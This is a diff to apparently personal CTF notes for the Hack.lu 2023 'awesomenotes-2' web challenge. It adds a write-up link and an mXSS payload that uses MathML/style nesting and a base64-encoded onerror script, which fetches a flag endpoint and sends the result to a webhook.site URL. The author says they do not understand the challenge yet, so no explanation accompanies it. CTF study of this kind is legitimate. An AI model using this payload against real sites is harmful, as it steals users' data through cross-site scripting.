@@ -53,9 +53,24 @@ fetch("/")
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018221504.png)
 
 ### awesomeII
+#xss 
+
+https://blog.bi0s.in/2023/10/16/Web/awesomenotes-2-HackluCTF2023/
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018222050.png)
 
 tags里是一堆数学公式标签,允许自定义style,
+
+
+看不懂了,先把payload写上
+
+---
+
+```html
+<math><annotation-xml encoding="text/html"><style><img src=x onerror="eval(atob('ZmV0Y2goYC9hcGkvbm90ZS9mbGFnYCkudGhlbigocik9PnIudGV4dCgpKS50aGVuKChyKT0+bG9jYXRpb249YGh0dHBzOi8vd2ViaG9vay5zaXRlL2NkNTA4YWJiLWFiZjQtNDJkYi05MmQ4LWFmNDFjZjkwMTdiMz9hPWArZW5jb2RlVVJJQ29tcG9uZW50KHIpKQo='))"></style></annotation-xml></math>
+```
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20231018223907.png)
+
 # reverse
 
 # pwn
